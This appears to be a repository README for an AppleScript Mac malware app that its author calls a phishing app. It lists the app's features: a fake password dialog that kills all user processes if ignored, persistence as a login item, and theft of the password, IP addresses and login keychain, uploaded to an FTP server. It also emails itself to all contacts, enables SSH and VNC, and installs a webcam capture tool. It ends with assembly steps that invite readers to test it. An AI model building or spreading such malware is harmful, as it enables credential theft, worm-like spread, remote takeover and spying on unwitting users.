Benb116's Phishing app for Mac
==========================
* It makes a new hidden directory in the user's public folder, then checks for a killswitch
* It prompts the user to enter their password into a dialog box. If they don't enter it within 20 seconds, the script kills all user processes, making the user have to restart in order to use the computer.
![image](/Users/Ben/Desktop/Screenshot 2012-10-16 at 6.42.54 AM.jpg)
*  It sets itself as a login item, so the user must enter the password in order to get rid of the threat.
*  It copies the password, username, date, WAN IP, and LAN IP to a text file in a hidden folder in the user's public folder
*  It uploads this file to an FTP server
*  It copies the user's login keychain into the same folder and uploads it to the FTP server
*  It stores all of the user's contacts' emails in a text file, then sends an email to all of them with the app attached.
*  It enables SSH and VNC for the computer
*  It installs isightcapture (these two parts are not necessary and are only if the phisher wants to be really mean)

The script is saved as an application with another application inside of it. It copies the inner application and sets it as a login item.

The script has had limited but successful testing. Please feel free to test it by doing the following:

1. Save Testing.applescript as an application
2. Save Updater testing.applescript as an application named "Updater.app"
3. Copy Updater.app to the resources folder of the first application
4. (optional) download isightcapture and stick it in there, too